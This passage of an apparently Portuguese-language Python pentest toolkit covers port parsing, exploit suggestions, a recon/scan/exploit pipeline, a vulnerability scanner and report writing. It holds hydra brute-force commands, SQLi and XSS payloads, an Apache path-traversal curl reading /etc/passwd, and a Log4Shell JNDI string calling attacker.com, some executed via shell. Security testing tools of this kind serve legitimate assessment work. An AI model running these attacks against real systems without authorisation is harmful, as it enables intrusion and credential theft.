            if in_port_section:
                if not line.strip():
                    break
                
                parts = line.split()
                if len(parts) >= 3:
                    port_part = parts[0]
                    if '/' in port_part:
                        port = port_part.split('/')[0]
                        service = parts[2] if len(parts) > 2 else 'unknown'
                        open_ports[port] = service
        
        return open_ports
    
    def _suggest_exploits(self, open_ports, target):
        """Sugerir exploits baseados nas portas abertas"""
        print(f"\n{Fore.YELLOW}EXPLOITS SUGERIDOS:{Style.RESET_ALL}")
        
        exploit_suggestions = {
            '21': 'FTP - Testar login anônimo: ftp {target}',
            '22': 'SSH - Força bruta: hydra -l root -P rockyou.txt ssh://{target}',
            '23': 'Telnet - Testar credenciais padrão',
            '25': 'SMTP - Enumerar usuários: smtp-user-enum',
            '80': 'HTTP - Testar vulnerabilidades web',
            '443': 'HTTPS - Testar vulnerabilidades web com SSL',
            '445': 'SMB - Testar sessão nula: smbclient -L {target} -N',
            '3306': 'MySQL - Testar login root sem senha',
            '3389': 'RDP - Força bruta: hydra -l administrator -P rockyou.txt rdp://{target}',
            '5900': 'VNC - Força bruta: hydra -P rockyou.txt vnc://{target}'
        }
        
        exploits_found = []
        
        for port, service in open_ports.items():
            if port in exploit_suggestions:
                suggestion = exploit_suggestions[port].format(target=target)
                print(f"  Porta {port} ({service}): {suggestion}")
                exploits_found.append((port, service, suggestion))
        
        if exploits_found:
            # Perguntar se quer executar algum
            print(f"\n{Fore.GREEN}Executar algum exploit? (s/n): {Style.RESET_ALL}", end='')
            choice = input().strip().lower()
            
            if choice == 's':
                print(f"{Fore.YELLOW}Selecione exploit pelo número da porta: {Style.RESET_ALL}", end='')
                port_choice = input().strip()
                
                if port_choice in [p for p, _, _ in exploits_found]:
                    for port, service, suggestion in exploits_found:
                        if port == port_choice:
                            print(f"\n{Fore.CYAN}Executando: {suggestion}{Style.RESET_ALL}")
                            
                            # Extrair comando
                            if ':' in suggestion:
                                command = suggestion.split(':')[1].strip()
                                
                                try:
                                    subprocess.run(command, shell=True, timeout=60)
                                except Exception as e:
                                    print(f"{Fore.RED}Erro: {e}{Style.RESET_ALL}")
    
    def view_exploits_database(self):
        """Visualizar banco de dados de exploits"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'BANCO DE DADOS DE EXPLOITS':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        for category, exploits in self.exploits_db.items():
            print(f"\n{Fore.YELLOW}{category.upper()}:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
            
            for name, info in exploits.items():
                print(f"\n{Fore.GREEN}{name}:{Style.RESET_ALL}")
                print(f"  Descrição: {info.get('description', 'N/A')}")
                print(f"  Risco: {info.get('risk', 'N/A')}")
                
                if 'tools' in info:
                    print(f"  Ferramentas: {', '.join(info['tools'])}")
                
                if 'command' in info:
                    print(f"  Comando: {info['command']}")
        
        print(f"\n{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        input(f"\n{Fore.YELLOW}Pressione Enter para continuar...{Style.RESET_ALL}")
    
    def add_custom_exploit(self):
        """Adicionar exploit personalizado"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'ADICIONAR EXPLOIT PERSONALIZADO':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        category = input(f"\n{Fore.GREEN}Categoria (web/network/wifi/other): {Style.RESET_ALL}").strip().lower()
        name = input(f"{Fore.GREEN}Nome do exploit: {Style.RESET_ALL}").strip()
        description = input(f"{Fore.GREEN}Descrição: {Style.RESET_ALL}").strip()
        risk = input(f"{Fore.GREEN}Risco (low/medium/high/critical): {Style.RESET_ALL}").strip().lower()
        command = input(f"{Fore.GREEN}Comando (use {target} para alvo): {Style.RESET_ALL}").strip()
        
        tools_input = input(f"{Fore.GREEN}Ferramentas (separadas por vírgula): {Style.RESET_ALL}").strip()
        tools = [t.strip() for t in tools_input.split(',')] if tools_input else []
        
        # Adicionar ao banco de dados
        if category not in self.exploits_db:
            self.exploits_db[category] = {}
        
        self.exploits_db[category][name] = {
            'description': description,
            'risk': risk,
            'tools': tools,
            'command': command
        }
        
        # Salvar
        db_file = Config.EXPLOITS_DIR / "exploits.json"
        with open(db_file, 'w') as f:
            json.dump(self.exploits_db, f, indent=2)
        
        print(f"\n{Fore.GREEN}✓ Exploit '{name}' adicionado com sucesso!{Style.RESET_ALL}")
    
    def full_pentest(self):
        """Teste de penetração completo"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'TESTE DE PENETRAÇÃO COMPLETO':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Este processo inclui:{Style.RESET_ALL}")
        print("1. Reconhecimento")
        print("2. Varredura")
        print("3. Enumeração")
        print("4. Exploração")
        print("5. Pós-exploração")
        print("6. Relatório")
        
        target = input(f"\n{Fore.GREEN}Alvo (IP/URL/rede): {Style.RESET_ALL}").strip()
        if not target:
            print(f"{Fore.RED}Alvo é obrigatório!{Style.RESET_ALL}")
            return
        
        confirm = input(f"\n{Fore.RED}Iniciar teste completo? Pode demorar. (s/n): {Style.RESET_ALL}").strip().lower()
        if confirm != 's':
            return
        
        # Criar diretório para o teste
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        test_dir = Config.SCANS_DIR / f"full_pentest_{target.replace('/', '_')}_{timestamp}"
        test_dir.mkdir(exist_ok=True)
        
        results = {
            'target': target,
            'timestamp': timestamp,
            'phases': {}
        }
        
        try:
            # Fase 1: Reconhecimento
            print(f"\n{Fore.YELLOW}[FASE 1] RECONHECIMENTO{Style.RESET_ALL}")
            recon_results = self._reconnaissance_phase(target, test_dir)
            results['phases']['reconnaissance'] = recon_results
            
            # Fase 2: Varredura
            print(f"\n{Fore.YELLOW}[FASE 2] VARREDURA{Style.RESET_ALL}")
            scan_results = self._scanning_phase(target, test_dir)
            results['phases']['scanning'] = scan_results
            
            # Fase 3: Enumeração
            print(f"\n{Fore.YELLOW}[FASE 3] ENUMERAÇÃO{Style.RESET_ALL}")
            enum_results = self._enumeration_phase(target, test_dir, scan_results)
            results['phases']['enumeration'] = enum_results
            
            # Fase 4: Exploração
            print(f"\n{Fore.YELLOW}[FASE 4] EXPLORAÇÃO{Style.RESET_ALL}")
            exploit_results = self._exploitation_phase(target, test_dir, enum_results)
            results['phases']['exploitation'] = exploit_results
            
            # Gerar relatório
            print(f"\n{Fore.YELLOW}[FASE 6] RELATÓRIO{Style.RESET_ALL}")
            self._generate_full_report(results, test_dir)
            
            print(f"\n{Fore.GREEN}{'='*80}")
            print(f"{'TESTE COMPLETO CONCLUÍDO!':^80}")
            print(f"{'='*80}{Style.RESET_ALL}")
            print(f"\nResultados salvos em: {test_dir}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Teste interrompido pelo usuário{Style.RESET_ALL}")
            # Salvar resultados parciais
            self._generate_full_report(results, test_dir, partial=True)
        except Exception as e:
            print(f"{Fore.RED}Erro no teste completo: {e}{Style.RESET_ALL}")
            self._generate_full_report(results, test_dir, partial=True)
    
    def _reconnaissance_phase(self, target, test_dir):
        """Fase de reconhecimento"""
        results = {'whois': '', 'dns': [], 'subdomains': []}
        
        print(f"{Fore.CYAN}1. Coletando informações WHOIS...{Style.RESET_ALL}")
        try:
            whois_cmd = f"whois {target.split('/')[0] if '/' in target else target}"
            whois_result = subprocess.run(whois_cmd, shell=True, capture_output=True, text=True, timeout=30)
            results['whois'] = whois_result.stdout[:1000]  # Limitar tamanho
            
            with open(test_dir / "whois.txt", 'w') as f:
                f.write(whois_result.stdout)
        except:
            pass
        
        print(f"{Fore.CYAN}2. Consultando DNS...{Style.RESET_ALL}")
        try:
            if DNS_AVAILABLE:
                resolver = dns.resolver.Resolver()
                record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA']
                
                for rtype in record_types:
                    try:
                        answers = resolver.resolve(target, rtype)
                        for answer in answers:
                            results['dns'].append(f"{rtype}: {answer}")
                    except:
                        pass
        except:
            pass
        
        print(f"{Fore.CYAN}3. Buscando subdomínios...{Style.RESET_ALL}")
        try:
            # Lista de subdomínios comuns
            subdomains = ['www', 'mail', 'ftp', 'admin', 'blog', 'api', 'dev']
            
            for sub in subdomains:
                test_sub = f"{sub}.{target}"
                try:
                    socket.gethostbyname(test_sub)
                    results['subdomains'].append(test_sub)
                except:
                    pass
        except:
            pass
        
        return results
    
    def _scanning_phase(self, target, test_dir):
        """Fase de varredura"""
        results = {'ports': {}, 'os': '', 'services': []}
        
        print(f"{Fore.CYAN}1. Scan de portas...{Style.RESET_ALL}")
        try:
            nmap_cmd = f"nmap -sS -sV -O -T4 -oN {test_dir}/nmap.txt {target}"
            subprocess.run(nmap_cmd, shell=True, timeout=300)
            
            # Ler resultados
            with open(test_dir / "nmap.txt", 'r') as f:
                nmap_output = f.read()
            
            # Parsear portas
            open_ports = self._parse_nmap_output(nmap_output)
            results['ports'] = open_ports
            
        except Exception as e:
            print(f"{Fore.RED}Erro no scan: {e}{Style.RESET_ALL}")
        
        return results
    
    def _enumeration_phase(self, target, test_dir, scan_results):
        """Fase de enumeração"""
        results = {'services': {}, 'vulnerabilities': []}
        
        # Enumerar serviços baseado nas portas
        for port, service in scan_results.get('ports', {}).items():
            service_info = {'port': port, 'service': service, 'banners': '', 'vulns': []}
            
            print(f"{Fore.CYAN}Enumerando porta {port} ({service})...{Style.RESET_ALL}")
            
            # Conectar e pegar banner
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target, int(port)))
                
                # Tentar receber banner
                try:
                    banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                    service_info['banners'] = banner[:500]
                except:
                    pass
                
                sock.close()
            except:
                pass
            
            # Verificar vulnerabilidades comuns
            if port == '21':  # FTP
                service_info['vulns'].append('Verificar login anônimo')
            elif port == '22':  # SSH
                service_info['vulns'].append('Verificar versão do SSH')
            elif port == '80':  # HTTP
                service_info['vulns'].append('Testar vulnerabilidades web')
            elif port == '445':  # SMB
                service_info['vulns'].append('Testar sessão nula SMB')
            
            results['services'][port] = service_info
        
        return results
    
    def _exploitation_phase(self, target, test_dir, enum_results):
        """Fase de exploração"""
        results = {'attempted': [], 'successful': [], 'credentials': []}
        
        print(f"{Fore.CYAN}Tentando explorações básicas...{Style.RESET_ALL}")
        
        for port, service_info in enum_results.get('services', {}).items():
            service = service_info['service']
            
            # Tentar explorações baseadas no serviço
            if 'ftp' in service.lower():
                print(f"  Testando FTP anônimo na porta {port}...")
                try:
                    ftp_cmd = f"ftp -n {target} {port} << EOF\nuser anonymous\npass anonymous\nquit\nEOF"
                    ftp_result = subprocess.run(ftp_cmd, shell=True, capture_output=True, text=True, timeout=10)
                    
                    if '230' in ftp_result.stdout:  # Login successful
                        results['successful'].append(f"FTP anônimo na porta {port}")
                        results['credentials'].append(f"ftp:{port}:anonymous:anonymous")
                except:
                    pass
            
            elif 'http' in service.lower():
                print(f"  Testando HTTP na porta {port}...")
                url = f"http://{target}:{port}" if port != '80' else f"http://{target}"
                
                # Testar diretórios comuns
                test_dirs = ['admin', 'login', 'wp-admin', 'phpmyadmin']
                for directory in test_dirs:
                    test_url = f"{url}/{directory}"
                    
                    try:
                        if REQUESTS_AVAILABLE:
                            response = requests.get(test_url, timeout=5, verify=False)
                            if response.status_code == 200:
                                results['attempted'].append(f"Diretório encontrado: {test_url}")
                    except:
                        pass
        
        return results
    
    def _generate_full_report(self, results, test_dir, partial=False):
        """Gerar relatório completo"""
        report_file = test_dir / "full_report.txt"
        
        with open(report_file, 'w') as f:
            f.write(f"{'='*80}\n")
            f.write(f"{'RELATÓRIO DE TESTE DE PENETRAÇÃO':^80}\n")
            if partial:
                f.write(f"{'(PARCIAL)':^80}\n")
            f.write(f"{'='*80}\n\n")
            
            f.write(f"Alvo: {results.get('target', 'N/A')}\n")
            f.write(f"Data: {results.get('timestamp', 'N/A')}\n")
            f.write(f"{'='*80}\n\n")
            
            # Reconhecimento
            f.write("1. RECONHECIMENTO\n")
            f.write("-" * 40 + "\n")
            
            recon = results.get('phases', {}).get('reconnaissance', {})
            if recon.get('whois'):
                f.write("WHOIS:\n")
                f.write(recon['whois'][:500] + "\n\n")
            
            if recon.get('dns'):
                f.write("DNS Records:\n")
                for record in recon['dns'][:10]:
                    f.write(f"  {record}\n")
                f.write("\n")
            
            if recon.get('subdomains'):
                f.write("Subdomínios encontrados:\n")
                for sub in recon['subdomains']:
                    f.write(f"  {sub}\n")
                f.write("\n")
            
            # Varredura
            f.write("2. VARREDURA\n")
            f.write("-" * 40 + "\n")
            
            scan = results.get('phases', {}).get('scanning', {})
            if scan.get('ports'):
                f.write("Portas abertas:\n")
                for port, service in scan['ports'].items():
                    f.write(f"  {port}/tcp - {service}\n")
                f.write("\n")
            
            # Enumeração
            f.write("3. ENUMERAÇÃO\n")
            f.write("-" * 40 + "\n")
            
            enum = results.get('phases', {}).get('enumeration', {})
            if enum.get('services'):
                f.write("Serviços enumerados:\n")
                for port, info in enum['services'].items():
                    f.write(f"  Porta {port}:\n")
                    f.write(f"    Serviço: {info.get('service', 'N/A')}\n")
                    if info.get('banners'):
                        f.write(f"    Banner: {info['banners'][:200]}\n")
                    if info.get('vulns'):
                        f.write(f"    Possíveis vulnerabilidades: {', '.join(info['vulns'])}\n")
                    f.write("\n")
            
            # Exploração
            f.write("4. EXPLORAÇÃO\n")
            f.write("-" * 40 + "\n")
            
            exploit = results.get('phases', {}).get('exploitation', {})
            if exploit.get('attempted'):
                f.write("Tentativas de exploração:\n")
                for attempt in exploit['attempted']:
                    f.write(f"  • {attempt}\n")
                f.write("\n")
            
            if exploit.get('successful'):
                f.write("EXPLORAÇÕES BEM-SUCEDIDAS:\n")
                for success in exploit['successful']:
                    f.write(f"  ✓ {success}\n")
                f.write("\n")
            
            if exploit.get('credentials'):
                f.write("Credenciais encontradas:\n")
                for cred in exploit['credentials']:
                    f.write(f"  {cred}\n")
                f.write("\n")
            
            # Recomendações
            f.write("5. RECOMENDAÇÕES\n")
            f.write("-" * 40 + "\n")
            
            vulnerabilities_found = []
            if exploit.get('successful'):
                vulnerabilities_found.extend(exploit['successful'])
            
            if vulnerabilities_found:
                f.write("AÇÕES IMEDIATAS RECOMENDADAS:\n")
                for i, vuln in enumerate(vulnerabilities_found, 1):
                    f.write(f"{i}. Corrigir: {vuln}\n")
            else:
                f.write("Nenhuma vulnerabilidade crítica encontrada.\n")
                f.write("Recomenda-se testes mais aprofundados.\n")
            
            f.write("\n" + "="*80 + "\n")
            f.write("FIM DO RELATÓRIO\n")
            f.write("="*80 + "\n")
        
        print(f"{Fore.GREEN}Relatório salvo em: {report_file}{Style.RESET_ALL}")
        
        # Salvar também em JSON
        json_file = test_dir / "results.json"
        with open(json_file, 'w') as f:
            json.dump(results, f, indent=2)

# ============================================================================
# SISTEMA DE ANÁLISE DE VULNERABILIDADES
# ============================================================================

class VulnerabilityAnalyzer:
    """Analisador de vulnerabilidades"""
    
    def __init__(self):
        self.logger = logging.getLogger('VulnerabilityAnalyzer')
        self.cve_database = self._load_cve_database()
        
    def _load_cve_database(self):
        """Carregar banco de dados CVE"""
        cve_file = Config.DATABASE_DIR / "cve_database.json"
        
        if cve_file.exists():
            try:
                with open(cve_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        
        # Banco de dados CVE simplificado
        cve_db = {
            'web': {
                'CVE-2021-41773': {
                    'description': 'Apache 2.4.49 Path Traversal',
                    'severity': 'high',
                    'affected': 'Apache 2.4.49',
                    'exploit': 'curl --path-as-is "http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"'
                },
                'CVE-2021-44228': {
                    'description': 'Log4Shell - Log4j RCE',
                    'severity': 'critical',
                    'affected': 'Log4j 2.0-beta9 to 2.14.1',
                    'exploit': '${jndi:ldap://attacker.com/a}'
                }
            },
            'network': {
                'CVE-2017-0144': {
                    'description': 'EternalBlue - SMB RCE',
                    'severity': 'critical',
                    'affected': 'Windows SMBv1',
                    'exploit': 'ms17_010_eternalblue'
                }
            },
            'wifi': {
                'CVE-2017-13077': {
                    'description': 'KRACK - Key Reinstallation Attack',
                    'severity': 'high',
                    'affected': 'WPA2',
                    'exploit': 'krack-test'
                }
            }
        }
        
        return cve_db
    
    def scan_for_vulnerabilities(self):
        """Scan para vulnerabilidades"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'SCANNER DE VULNERABILIDADES':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Tipos de scan:{Style.RESET_ALL}")
        print("1. Scan de vulnerabilidades web")
        print("2. Scan de serviços de rede")
        print("3. Scan de configurações WiFi")
        print("4. Scan completo")
        
        scan_type = input(f"\n{Fore.GREEN}Selecione tipo [1-4]: {Style.RESET_ALL}").strip()
        
        target = input(f"{Fore.GREEN}Alvo (IP/URL): {Style.RESET_ALL}").strip()
        if not target:
            print(f"{Fore.RED}Alvo é obrigatório!{Style.RESET_ALL}")
            return
        
        if scan_type == '1':
            self._web_vulnerability_scan(target)
        elif scan_type == '2':
            self._network_vulnerability_scan(target)
        elif scan_type == '3':
            self._wifi_vulnerability_scan(target)
        elif scan_type == '4':
            self._full_vulnerability_scan(target)
    
    def _web_vulnerability_scan(self, target):
        """Scan de vulnerabilidades web"""
        print(f"\n{Fore.YELLOW}Scan de vulnerabilidades web em {target}{Style.RESET_ALL}")
        
        vulnerabilities = []
        
        print(f"{Fore.CYAN}1. Verificando headers de segurança...{Style.RESET_ALL}")
        if REQUESTS_AVAILABLE:
            try:
                response = requests.get(target if target.startswith('http') else f'http://{target}', 
                                      timeout=10, verify=False)
                
                # Verificar headers
                security_headers = ['X-Frame-Options', 'X-Content-Type-Options', 
                                  'X-XSS-Protection', 'Strict-Transport-Security']
                
                missing = []
                for header in security_headers:
                    if header not in response.headers:
                        missing.append(header)
                
                if missing:
                    vulnerabilities.append(f"Headers de segurança ausentes: {', '.join(missing)}")
                
                # Verificar server header
                if 'Server' in response.headers:
                    server = response.headers['Server']
                    vulnerabilities.append(f"Server header exposto: {server}")
                    
            except Exception as e:
                print(f"{Fore.RED}Erro: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}2. Testando para SQL injection...{Style.RESET_ALL}")
        # Testes básicos de SQLi
        test_params = ['id', 'page', 'view', 'user']
        sql_payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--"]
        
        for param in test_params:
            for payload in sql_payloads:
                test_url = f"{target}?{param}={payload}"
                try:
                    if REQUESTS_AVAILABLE:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if 'sql' in response.text.lower() or 'syntax' in response.text.lower():
                            vulnerabilities.append(f"Possível SQLi no parâmetro {param}")
                            break
                except:
                    pass
        
        print(f"{Fore.CYAN}3. Testando para XSS...{Style.RESET_ALL}")
        xss_payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
        
        for param in test_params:
            for payload in xss_payloads:
                test_url = f"{target}?{param}={payload}"
                try:
                    if REQUESTS_AVAILABLE:
                        response = requests.get(test_url, timeout=5, verify=False)
                        if payload in response.text:
                            vulnerabilities.append(f"Possível XSS no parâmetro {param}")
                            break
                except:
                    pass
        
        # Mostrar resultados
        self._display_vulnerabilities(target, vulnerabilities, 'web')
    
    def _display_vulnerabilities(self, target, vulnerabilities, scan_type):
        """Exibir vulnerabilidades encontradas"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'RESULTADOS DO SCAN':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\nAlvo: {target}")
        print(f"Tipo: {scan_type}")
        print(f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n{Fore.CYAN}{'-'*80}{Style.RESET_ALL}")
        
        if vulnerabilities:
            print(f"\n{Fore.RED}VULNERABILIDADES ENCONTRADAS ({len(vulnerabilities)}):{Style.RESET_ALL}")
            
            for i, vuln in enumerate(vulnerabilities, 1):
                print(f"\n{i}. {vuln}")
                
                # Sugerir mitigação
                if 'SQL' in vuln:
                    print(f"   {Fore.YELLOW}Mitigação: Use prepared statements, valide entrada{Style.RESET_ALL}")
                elif 'XSS' in vuln:
                    print(f"   {Fore.YELLOW}Mitigação: Escape output, use Content-Security-Policy{Style.RESET_ALL}")
                elif 'header' in vuln.lower():
                    print(f"   {Fore.YELLOW}Mitigação: Configure headers de segurança{Style.RESET_ALL}")
                elif 'exposed' in vuln.lower():
                    print(f"   {Fore.YELLOW}Mitigação: Oculte informações do servidor{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}✓ Nenhuma vulnerabilidade óbvia encontrada{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Nota: Este é um scan básico. Testes manuais são recomendados.{Style.RESET_ALL}")
        
        # Salvar relatório
        self._save_vuln_report(target, vulnerabilities, scan_type)
    
    def _save_vuln_report(self, target, vulnerabilities, scan_type):
        """Salvar relatório de vulnerabilidades"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = Config.REPORTS_DIR / f"vuln_scan_{target.replace('/', '_')}_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write(f"Relatório de Scan de Vulnerabilidades\n")
            f.write(f"{'='*60}\n")
            f.write(f"Alvo: {target}\n")
            f.write(f"Tipo: {scan_type}\n")
            f.write(f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"{'='*60}\n\n")
            
            f.write("VULNERABILIDADES ENCONTRADAS:\n")
            f.write("-" * 40 + "\n")
            
            if vulnerabilities:
                for i, vuln in enumerate(vulnerabilities, 1):
                    f.write(f"{i}. {vuln}\n")
            else:
                f.write("Nenhuma vulnerabilidade encontrada\n")
            
            f.write("\nRECOMENDAÇÕES:\n")
            f.write("-" * 40 + "\n")
            f.write("1. Corrigir vulnerabilidades encontradas\n")
            f.write("2. Realizar testes mais aprofundados\n")
            f.write("3. Manter sistemas atualizados\n")
            f.write("4. Implementar práticas de segurança\n")
        
        print(f"\n{Fore.GREEN}Relatório salvo em: {report_file}{Style.RESET_ALL}")

# ============================================================================
# SISTEMA DE RELATÓRIOS PROFISSIONAIS
# ============================================================================

class ProfessionalReportingSystem:
    """Sistema de relatórios profissionais"""
    
    def __init__(self):
        self.logger = logging.getLogger('ReportingSystem')
        
    def generate_report(self):
        """Gerar relatório profissional"""
        print(f"\n{Fore.CYAN}{'='*80}")
        print(f"{'SISTEMA DE RELATÓRIOS PROFISSIONAIS':^80}")
        print(f"{'='*80}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Tipos de relatório:{Style.RESET_ALL}")
        print("1. Relatório de pentest completo")
        print("2. Relatório de vulnerabilidades")
        print("3. Relatório de scan de rede")
        print("4. Relatório de segurança WiFi")
        print("5. Relatório personalizado")
        
        report_type = input(f"\n{Fore.GREEN}Selecione tipo [1-5]: {Style.RESET_ALL}").strip()
        
        if report_type == '1':
            self._generate_pentest_report()
        elif report_type == '2':
            self._generate_vulnerability_report()
        elif report_type == '3':
            self._generate_network_report()
        elif report_type == '4':
            self._generate_wifi_report()
        elif report_type == '5':
            self._generate_custom_report()
    
    def _generate_pentest_report(self):
        """Gerar relatório de pentest completo"""
        print(f"\n{Fore.YELLOW}Gerando relatório de pentest...{Style.RESET_ALL}")
        
        # Coletar informações
        client = input(f"{Fore.GREEN}Cliente: {Style.RESET_ALL}").strip()
        target = input(f"{Fore.GREEN}Alvo(s): {Style.RESET_ALL}").strip()
        date = input(f"{Fore.GREEN}Data do teste (YYYY-MM-DD): {Style.RESET_ALL}").strip() or datetime.now().strftime('%Y-%m-%d')
        scope = input(f"{Fore.GREEN}Escopo do teste: {Style.RESET_ALL}").strip()
        
        # Coletar resultados
        print(f"\n{Fore.YELLOW}Coletando resultados...{Style.RESET_ALL}")
        
        vulnerabilities = []
        while True:
            vuln = input(f"{Fore.GREEN}Vulnerabilidade encontrada (ou 'fim' para terminar): {Style.RESET_ALL}").strip()
            if vuln.lower() == 'fim':
                break
            if vuln:
                severity = input(f"  Severidade (baixa/média/alta/crítica): {Style.RESET_ALL}").strip()
                description = input(f"  Descrição: {Style.RESET_ALL}").strip()
                recommendation = input(f"  Recomendação: {Style.RESET_ALL}").strip()
                
                vulnerabilities.append({
                    'vulnerability': vuln,
                    'severity': severity,
                    'description': description,
                    'recommendation': recommendation
                })
        
        # Gerar relatório
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = Config.REPORTS_DIR / f"pentest_report_{client.replace(' ', '_')}_{timestamp}.pdf"
        
        # Criar relatório em texto (simplificado)
        txt_file = report_file.with_suffix('.txt')
        
        with open(txt_file, 'w') as f:
            self._write_pentest_report(f, client, target, date, scope, vulnerabilities)
        
        print(f"\n{Fore.GREEN}Relatório gerado: {txt_file}{Style.RESET_ALL}")
        
        # Perguntar se quer converter para PDF
        if input(f"\n{Fore.GREEN}Converter para PDF? (s/n): {Style.RESET_ALL}").strip().lower() == 's':
            self._convert_to_pdf(txt_file, report_file)
    
    def _write_pentest_report(self, file, client, target, date, scope, vulnerabilities):
        """Escrever relatório de pentest"""
        file.write(f"{'='*80}\n")
        file.write(f"{'RELATÓRIO DE TESTE DE PENETRAÇÃO':^80}\n")
        file.write(f"{'='*80}\n\n")
        
        file.write(f"Cliente: {client}\n")
        file.write(f"Data: {date}\n")
        file.write(f"Alvo(s): {target}\n")
        file.write(f"Escopo: {scope}\n\n")
        
        file.write(f"{'='*80}\n")
        file.write(f"{'RESUMO EXECUTIVO':^80}\n")
        file.write(f"{'='*80}\n\n")
        
        # Contar vulnerabilidades por severidade
        severities = {'baixa': 0, 'média': 0, 'alta': 0, 'crítica': 0}
        for vuln in vulnerabilities:
            sev = vuln['severity'].lower()
            if sev in severities:
                severities[sev] += 1
        
        file.write("Vulnerabilidades encontradas:\n")
        for sev, count in severities.items():
            if count > 0:
                file.write(f"  {sev.capitalize()}: {count}\n")
        
        file.write(f"\nTotal: {len(vulnerabilities)} vulnerabilidades\n\n")
        
        file.write(f"{'='*80}\n")
        file.write(f"{'METODOLOGIA':^80}\n")
        file.write(f"{'='*80}\n\n")
        
        file.write("1. Reconhecimento\n")
        file.write("2. Varredura\n")
        file.write("3. Enumeração\n")
        file.write("4. Exploração\n")
        file.write("5. Pós-exploração\n")
        file.write("6. Análise\n\n")
        
        file.write(f"{'='*80}\n")
        file.write(f"{'VULNERABILIDADES DETALHADAS':^80}\n")
        file.write(f"{'='*80}\n\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            file.write(f"{i}. {vuln['vulnerability']}\n")
            file.write(f"   Severidade: {vuln['severity']}\n")
            file.write(f"   Descrição: {vuln['description']}\n")
            file.write(f"   Recomendação: {vuln['recommendation']}\n\n")
        
        file.write(f"{'='*80}\n")
        file.write(f"{'RECOMENDAÇÕES GERAIS':^80}\n")
        file.write(f"{'='*80}\n\n")
        
        file.write("1. Corrigir vulnerabilidades críticas e altas imediatamente\n")
        file.write("2. Implementar patches de segurança regularmente\n")
        file.write("3. Realizar testes de penetração periodicamente\n")
        file.write("4. Treinar equipe em segurança da informação\n")
        file.write("5. Implementar monitoramento contínuo\n\n")
        
        file.write(f"{'='*80}\n")
        file.write(f"{'CONCLUSÃO':^80}\n")
        file.write(f"{'='*80}\n\n")
        
        if vulnerabilities:
            file.write("Foram encontradas vulnerabilidades que requerem atenção imediata.\n")
            file.write("Recomenda-se a implementação das correções sugeridas o mais breve possível.\n")
        else:
            file.write("Nenhuma vulnerabilidade crítica foi encontrada.\n")
            file.write("Recomenda-se a manutenção das boas práticas de segurança.\n")
        
        file.write(f"\n{'='*80}\n")
        file.write(f"{'FIM DO RELATÓRIO':^80}\n")
        file.write(f"{'='*80}\n")
    
    def _convert_to_pdf(self, txt_file, pdf_file):
        """Converter relatório para PDF"""
        try:
            # Usar reportlab se disponível
            try:
                from reportlab.lib.pagesizes import letter
                from reportlab.pdfgen import canvas
                from reportlab.lib.styles import getSampleStyleSheet
                from reportlab.platypus import SimpleDocTemplate, Paragraph
                from reportlab.lib.units import inch
                
                doc = SimpleDocTemplate(str(pdf_file), pagesize=letter)
                styles = getSampleStyleSheet()
                story = []
                
                # Ler arquivo texto
                with open(txt_file, 'r') as f:
                    lines = f.readlines()
                
                for line in lines:
                    story.append(Paragraph(line.replace('\n', '<br/>'), styles['Normal']))
                
                doc.build(story)
                print(f"{Fore.GREEN}PDF gerado: {pdf_file}{Style.RESET_ALL}")
                
            except ImportError:
                print(f"{Fore.YELLOW}reportlab não disponível. Usando conversão simples...{Style.RESET_ALL}")
                
                # Conversão simples usando html2pdf se disponível
                try:
                    import pdfkit
                    
                    # Converter txt para html
                    html_content = f"""
                    <html>
                    <head>
                        <style>
                            body {{ font-family: Arial, sans-serif; margin: 40px; }}
                            h1 {{ color: #333; }}
                            .vuln {{ margin: 20px 0; padding: 10px; background: #f5f5f5; }}
                            .critical {{ border-left: 5px solid #ff0000; }}
                            .high {{ border-left: 5px solid #ff6600; }}
                            .medium {{ border-left: 5px solid #ffcc00; }}
                            .low {{ border-left: 5px solid #00cc00; }}
                        </style>
                    </head>
                    <body>
                        <h1>Relatório de Pentest</h1>
                        <pre>{open(txt_file).read()}</pre>
                    </body>
                    </html>
                    """
                    
                    html_file = txt_file.with_suffix('.html')
                    with open(html_file, 'w') as f:
                        f.write(html_content)
                    
                    pdfkit.from_file(str(html_file), str(pdf_file))
                    print(f"{Fore.GREEN}PDF gerado: {pdf_file}{Style.RESET_ALL}")
                    
                except ImportError:
                    print(f"{Fore.YELLOW}pdfkit não disponível. Mantendo apenas versão TXT.{Style.RESET_ALL}")
                    
        except Exception as e:
